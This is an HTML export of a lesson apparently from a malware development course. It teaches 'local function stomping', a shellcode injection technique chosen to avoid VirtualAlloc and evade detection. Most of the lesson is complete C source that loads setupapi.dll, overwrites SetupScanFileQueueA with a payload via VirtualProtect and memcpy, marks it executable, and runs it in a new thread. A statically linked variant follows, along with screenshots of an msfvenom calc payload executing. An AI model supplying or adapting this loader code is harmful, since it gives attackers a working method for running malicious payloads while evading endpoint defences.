<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>44. Local Function Stomping Injection</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="c935dd1a-71c8-4505-9628-b12d6c3cdcb8" class="page sans"><header><h1 class="page-title"><a href="https://maldevacademy.com/modules/44"><strong>44. Local Function Stomping Injection</strong></a></h1></header><div class="page-body"><h2 id="74b67581-4e0c-4e76-a0e6-011d06e5fbe3" class=""><strong>Local Function Stomping Injection</strong></h2><h3 id="cf69c149-7b8f-43f5-a784-0d04b3ed2906" class=""><strong>Introduction</strong></h3><p id="33950ad1-b8a8-4d6c-9b91-a6fd632ab9ae" class="">The previously demonstrated mapping injection modules were used to avoid the usage of <code>VirtualAlloc/Ex</code> WinAPI calls. This module will demonstrate another method that avoids the usage of these WinAPIs.</p><h3 id="ff7bd100-b96f-46ca-bb05-3c88a71d77e0" class=""><strong>Function Stomping</strong></h3><p id="9230dc35-c703-4b62-966c-92b311a59247" class="">The term &quot;stomping&quot; refers to the act of overwriting or replacing the memory of a function or other data structure in a program with different data.</p><p id="51ddfdfb-9e96-4252-95b3-4d9320fbd509" class="">Function stomping is a technique where the original function&#x27;s bytes are replaced with new code resulting in the function being replaced or no longer working as intended. Instead, the function will execute different logic. To implement this, a sacrificial function address is required to be stomped.</p><h3 id="7fc7cd1a-fed5-495b-8182-2ea32f2585e5" class=""><strong>Choosing a Target Function</strong></h3><p id="f36cc1c1-4b8c-4497-996f-5204e62e20df" class="">Retrieving the address of a function locally is simple, but which function is being retrieved is the main concern with this technique. Overwriting a commonly used function can result in the uncontrolled execution of the payload or the process can crash. Therefore it should be clear that targeting functions exported from <code>ntdll.dll</code>, <code>kernel32.dll</code> and <code>kernelbase.dll</code> is risky. Instead, less commonly used functions should be targeted such as <code>MessageBox</code> since it will be rarely used by the operating system or other applications.</p><h3 id="7eabff9e-c089-46de-acd8-9d5abef0c4f9" class=""><strong>Using The Stomped Function</strong></h3><p id="b8a6dd39-eee3-4da6-9ee5-ef36279003d1" class="">When a target function&#x27;s bytes are replaced with that of the payload&#x27;s, the function cannot be used anymore unless it is specifically for payload execution. For example, if the target function is <code>MessageBoxA</code> then the binary should only call <code>MessageBoxA</code> once, which is when the payload will be executed.</p><h3 id="f38a0e8b-f86e-4258-adb7-5888626ecb0c" class=""><strong>Local Function Stomping Code</strong></h3><p id="cce5d9cb-12a9-4756-bd04-d0e4aef950c1" class="">For the code demonstration below, the target function is <a href="https://learn.microsoft.com/en-us/windows/win32/api/setupapi/nf-setupapi-setupscanfilequeuea">SetupScanFileQueueA</a>. This is a completely random function but is unlikely to cause any problems if it&#x27;s overwritten. Based on Microsoft&#x27;s documentation, the function is exported from <code>Setupapi.dll</code>. Therefore the first step would be to load <code>Setupapi.dll</code> into the local process memory using <code>LoadLibraryA</code> and then retrieve the function&#x27;s address using <code>GetProcAddress</code>.</p><p id="4d82c1c7-57e6-4e45-8157-7378c5e004f6" class="">The next step would be to stomp the function and replace it with the payload. Ensure the function can be overwritten by marking its memory region as readable and writable using <code>VirtualProtect</code>. Next, the payload is written into the function&#x27;s address and finally, <code>VirtualProtect</code> is used again to mark the region as executable (<code>RX</code> or <code>RWX</code>).</p><pre id="b66a4c67-5497-41d7-8066-b04be4736087" class="code code-wrap"><code>#define		SACRIFICIAL_DLL          &quot;setupapi.dll&quot;#define		SACRIFICIAL_FUNC         &quot;SetupScanFileQueueA&quot;// ...

BOOL WritePayload(IN PVOID pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	DWORD	dwOldProtection		= NULL;


	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_READWRITE, &amp;dwOldProtection)){
		printf(&quot;[!] VirtualProtect [RW] Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

	memcpy(pAddress, pPayload, sPayloadSize);

	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
		printf(&quot;[!] VirtualProtect [RWX] Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

	return TRUE;
}



int main() {

	PVOID		pAddress	= NULL;
	HMODULE		hModule		= NULL;
	HANDLE		hThread		= NULL;


	printf(&quot;[#] Press &lt;Enter&gt; To Load \&quot;%s\&quot; ... &quot;, SACRIFICIAL_DLL);
	getchar();

	printf(&quot;[i] Loading ... &quot;);
	hModule = LoadLibraryA(SACRIFICIAL_DLL);
	if (hModule == NULL){
		printf(&quot;[!] LoadLibraryA Failed With Error : %d \n&quot;, GetLastError());
		return -1;
	}
	printf(&quot;[+] DONE \n&quot;);



	pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
	if (pAddress == NULL){
		printf(&quot;[!] GetProcAddress Failed With Error : %d \n&quot;, GetLastError());
		return -1;
	}


	printf(&quot;[+] Address Of \&quot;%s\&quot; : 0x%p \n&quot;, SACRIFICIAL_FUNC, pAddress);


	printf(&quot;[#] Press &lt;Enter&gt; To Write Payload ... &quot;);
	getchar();
	printf(&quot;[i] Writing ... &quot;);
	if (!WritePayload(pAddress, Payload, sizeof(Payload))) {
		return -1;
	}
	printf(&quot;[+] DONE \n&quot;);



	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
	getchar();

	hThread = CreateThread(NULL, NULL, pAddress, NULL, NULL, NULL);
	if (hThread != NULL)
		WaitForSingleObject(hThread, INFINITE);

	printf(&quot;[#] Press &lt;Enter&gt; To Quit ... &quot;);
	getchar();

	return 0;

}

</code></pre><h3 id="b99bea4c-af64-4291-a6be-5596d660b83b" class=""><strong>Inserting DLL Into Binary</strong></h3><p id="29664916-555d-4c0f-b230-37127dc25011" class="">Instead of loading the DLL using <code>LoadLibrary</code> and then retrieving the target function&#x27;s address with <code>GetProcAddress</code>, it&#x27;s possible to statically link the DLL into the binary. Using the pragma comment compiler directive allows for this, as shown below.</p><pre id="197c6f10-c98d-4412-aaff-d58d990d8200" class="code code-wrap"><code>#pragma comment (lib, &quot;Setupapi.lib&quot;) // Adding &quot;setupapi.dll&quot; to the Import Address Table</code></pre><p id="e5e60edc-fe70-4c0c-a099-33756c053035" class="">The target function can then be simply retrieved using the address-of-operator (e.g. <code>&amp;SetupScanFileQueueA</code>). The code snippet below updates the previous code snippet to use the pragma comment directive.</p><pre id="033338da-14ed-4d80-a752-ddead7b01c19" class="code code-wrap"><code>#pragma comment (lib, &quot;Setupapi.lib&quot;) // Adding &quot;setupapi.dll&quot; to the Import Address Table// ...


int main() {

	HANDLE		hThread			= NULL;


	printf(&quot;[+] Address Of \&quot;SetupScanFileQueueA\&quot; : 0x%p \n&quot;, &amp;SetupScanFileQueueA);


	printf(&quot;[#] Press &lt;Enter&gt; To Write Payload ... &quot;);
	getchar();
	printf(&quot;[i] Writing ... &quot;);
	if (!WritePayload(&amp;SetupScanFileQueueA, Payload, sizeof(Payload))) { // Using the address-of operator
		return -1;
	}
	printf(&quot;[+] DONE \n&quot;);



	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
	getchar();

	hThread = CreateThread(NULL, NULL, SetupScanFileQueueA, NULL, NULL, NULL);
	if (hThread != NULL)
		WaitForSingleObject(hThread, INFINITE);

	printf(&quot;[#] Press &lt;Enter&gt; To Quit ... &quot;);
	getchar();

	return 0;

}

</code></pre><h3 id="255258d0-2ef4-49b8-a8a6-a1e9c0f8cd2d" class=""><strong>Demo</strong></h3><p id="95894b25-2a1d-471b-989e-f54192166155" class="">Retrieving <code>SetupScanFileQueueA</code>&#x27;s address.</p><p id="3a1aa433-d120-4662-9e07-dcdfbe0d52d6" class="">
</p><figure id="a1313e1c-b9d8-430a-a081-e6ec61d47f85" class="image"><a href="44%20Local%20Function%20Stomping%20Injection%20c935dd1a71c845059628b12d6c3cdcb8/stomp-109438900-53f68143-4143-4be4-978c-4c38e9b4f0d4.png"><img style="width:1353px" src="44%20Local%20Function%20Stomping%20Injection%20c935dd1a71c845059628b12d6c3cdcb8/stomp-109438900-53f68143-4143-4be4-978c-4c38e9b4f0d4.png"/></a></figure><p id="34a87327-e1a3-4739-a0e1-555dcba56de0" class="">The original bytes of the <code>SetupScanFileQueueA</code> function.</p><figure id="57f6a265-536e-405a-b42f-e0d5a12f0a1f" class="image"><a href="44%20Local%20Function%20Stomping%20Injection%20c935dd1a71c845059628b12d6c3cdcb8/stomp-209438901-b436065b-17a9-43b2-86a9-da708329b4c7.png"><img style="width:1419px" src="44%20Local%20Function%20Stomping%20Injection%20c935dd1a71c845059628b12d6c3cdcb8/stomp-209438901-b436065b-17a9-43b2-86a9-da708329b4c7.png"/></a></figure><p id="7c8e7022-0241-430c-ab20-51f0bd91a257" class="">Replacing the function&#x27;s bytes with the Msfvenom calc payload.</p><figure id="d6ae5b4b-019d-4246-ba9d-802a729ecb86" class="image"><a href="44%20Local%20Function%20Stomping%20Injection%20c935dd1a71c845059628b12d6c3cdcb8/stomp-309438902-a96c9c50-7ac1-42f9-918f-992a2ef749d6.png"><img style="width:1217px" src="44%20Local%20Function%20Stomping%20Injection%20c935dd1a71c845059628b12d6c3cdcb8/stomp-309438902-a96c9c50-7ac1-42f9-918f-992a2ef749d6.png"/></a></figure><p id="52dec8a6-af7f-459f-8607-99e69c4028f2" class="">Running the payload.</p><figure id="72df075e-9647-4abc-ba1a-212b6604f2de" class="image"><a href="44%20Local%20Function%20Stomping%20Injection%20c935dd1a71c845059628b12d6c3cdcb8/stomp-409438904-bfacfa89-e6cb-4903-9cd1-7a55c9b66697.png"><img style="width:1455px" src="44%20Local%20Function%20Stomping%20Injection%20c935dd1a71c845059628b12d6c3cdcb8/stomp-409438904-bfacfa89-e6cb-4903-9cd1-7a55c9b66697.png"/></a></figure></div></article></body></html>